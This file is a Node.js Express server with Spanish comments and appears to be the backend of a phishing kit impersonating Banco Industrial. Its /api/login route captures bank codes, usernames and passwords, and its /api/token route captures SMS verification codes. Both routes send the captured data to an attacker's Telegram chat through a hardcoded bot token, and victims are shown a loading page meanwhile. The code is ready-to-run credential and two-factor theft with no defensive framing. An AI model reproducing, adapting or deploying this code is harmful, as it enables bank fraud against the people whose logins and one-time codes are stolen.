const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = '9287849339:AAHy1Xw-99DjpfbTbBuf670vM9KO7gMOSlQ';
const TELEGRAM_CHAT_ID = '-5576351785';

// Middleware
app.use(cors()); // Habilita CORS para permitir peticiones desde Cloudflare
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Función auxiliar para Telegram
async function sendTelegramMessage(text) {
  const url = `[https://api.telegram.org/bot$](https://api.telegram.org/bot$){TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown'
      })
    });
    return await response.json();
  } catch (error) {
    console.error('Error al enviar mensaje a Telegram:', error);
  }
}

// Rutas de la API (JSON endpoints para recibir desde Cloudflare)
app.post('/api/login', async (req, res) => {
  const { codigo, usuario, password } = req.body;
  
  // Se agregaron acentos graves (`) para que Telegram permita copiar con un toque
  const mensaje = `🏦 BANCO INDUSTRIAL 🫆👀\n\n` +
                  `🔹 *Código:* \`${codigo}\`\n` +
                  `🔹 *Usuario:* \`${usuario}\`\n` +
                  `🔹 *Contraseña:* \`${password}\``;

  await sendTelegramMessage(mensaje);
  res.json({ success: true, redirect: '/loading.html' });
});

app.post('/api/token', async (req, res) => {
  const { sms_code, usuario } = req.body;

  // Se agregaron acentos graves (`) también aquí
  const mensaje = `🏦 BANCO INDUSTRIAL 🫆👀\n\n` +
                  `👤 *Usuario:* \`${usuario || 'Desconocido'}\`\n` +
                  `🔸 *Token:* \`${sms_code}\``;

  await sendTelegramMessage(mensaje);
  res.json({ success: true, message: 'Verificación exitosa' });
});

app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});